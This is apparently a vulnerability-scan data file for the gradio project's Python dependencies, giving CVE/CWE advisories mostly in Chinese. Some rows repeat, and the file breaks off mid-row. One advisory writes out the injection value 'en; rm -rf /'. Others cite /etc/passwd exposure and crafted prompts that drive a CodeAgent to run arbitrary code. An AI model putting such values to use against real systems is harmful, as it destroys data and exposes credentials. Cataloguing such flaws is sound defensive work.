gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
gradio-app_gradio,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
gradio-app_gradio,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
gradio-app_gradio,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
gradio-app_gradio,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
gradio-app_gradio,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,matplotlib,,True,CVE-2013-1424,CWE-120,2025-06-26,matplotlib 是一个用于生成图形和可视化的 Python 库，广泛应用于数据分析和科学计算领域。此组件提供了丰富的绘图功能，使用者可以创建各类复杂图表和图形。缓冲区溢出漏洞通常是由于程序未能正确限制输入的数据长度，导致攻击者发送过多数据，覆盖内存中的其他区域，从而可能执行任意代码。在这种情况下，matplotlib 在版本更新之前的某些操作中，由于缓冲区处理不当，可能引发缓冲区溢出。,3,0
gradio-app_gradio,SQLAlchemy,,True,CVE-2012-0805,CWE-89,2012-03-13,"SQLAlchemy 0.7.0b4之前版本中存在多个SQL注入漏洞，这些漏洞源于通过limit""和""offset""关键词向""select()""函数传递的输入，在用于SQL查询之前未经正确过滤。攻击者可通过注入任意SQL代码，操控SQL查询。",1,2
gradio-app_gradio,SQLAlchemy,,True,CVE-2019-7164,CWE-89,2019-02-11,<p>SQLAlchemy是一款基于Python的开源数据库ORM软件。该产品主要提供SQL工具包及对象关系映射工具。 SQLAlchemy 1.2.17及之前版本和1.3.x版本至1.3.0b2版本中存在SQL注入漏洞。远程攻击者可借助‘order_by’参数利用该漏洞执行SQL命令。</p>,1,1
gradio-app_gradio,SQLAlchemy,,True,CVE-2019-7548,CWE-89,2019-02-06,<p>SQLAlchemy是一款基于Python的开源数据库ORM软件。该产品主要提供SQL工具包及对象关系映射工具。 SQLAlchemy 1.2.17版本中存在SQL注入漏洞。远程攻击者可借助group_by参数发送特制的SQL语句利用该漏洞查看、添加、修改或删除后端数据库中的信息。</p>,1,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,matplotlib,,True,CVE-2013-1424,CWE-120,2025-06-26,matplotlib 是一个用于生成图形和可视化的 Python 库，广泛应用于数据分析和科学计算领域。此组件提供了丰富的绘图功能，使用者可以创建各类复杂图表和图形。缓冲区溢出漏洞通常是由于程序未能正确限制输入的数据长度，导致攻击者发送过多数据，覆盖内存中的其他区域，从而可能执行任意代码。在这种情况下，matplotlib 在版本更新之前的某些操作中，由于缓冲区处理不当，可能引发缓冲区溢出。,3,0
gradio-app_gradio,opencv-python,,True,CVE-2019-14493,CWE-476,2019-08-01,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.1之前版本中的modules/core/src/persistence.cpp文件的‘cv::XMLParser::parse’函数存在代码问题漏洞。该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2017-12605,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的utils.cpp文件的‘FillColorRow8’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12863,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘PxMDecoder::readData’函数存在整数溢出漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2018-5268,CWE-787,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_jpeg2000.cpp文件的‘cv::Jpeg2KDecoder::readComponent8u’函数存在基于堆的缓冲区溢出漏洞。攻击者可借助特制的图像文件利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12862,CWE-787,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/grfmt_pxm.cpp文件存在安全漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-14136,CWE-787,2017-09-04,"OpenCV(Open Source Computer Vision Library)是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3版本中的utils.cpp文件的‘FillColorRow1’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-1000450,CWE-190,2018-01-02,"Opencv是一个开源的、跨平台的、轻量级的计算机视觉库。
Opencv 3.3及之前的版本中的opencv/modules/imgcodecs/src/utils.cpp文件的‘FillUniColor’和‘FillUniGray’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-18009,CWE-125,2018-01-01,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_hdr.cpp文件的‘cv::HdrDecoder::checkSignature’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（基于堆的缓冲区越边界读取）。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2018-5269,CWE-617,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::setPos’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（断言失败和崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2016-1516,CWE-415,2017-04-09,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.0.0版本中存在双重释放漏洞。攻击者可利用该漏洞执行任意代码。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12864,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘ReadNumber’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-17760,CWE-119,2017-12-21,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的grfmt_pxm.cpp文件的‘cv::PxMDecoder::readData’函数存在缓冲区溢出漏洞，该漏洞源于程序使用了不正确的大小值。攻击者可利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12603,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RLByteStream::getBytes’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（无效内存写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2019-15939,CWE-369,2019-09-05,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.0版本中的modules/objdetect/src/hog.cpp文件的cv::HOGDescriptor::getDescriptorSize存在数字错误漏洞。该漏洞源于网络系统或产品未正确计算或转换所产生的数字。攻击者可利用该漏洞导致整数溢出或符号错误等。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12598,CWE-125,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::readBlock’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界读取）。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

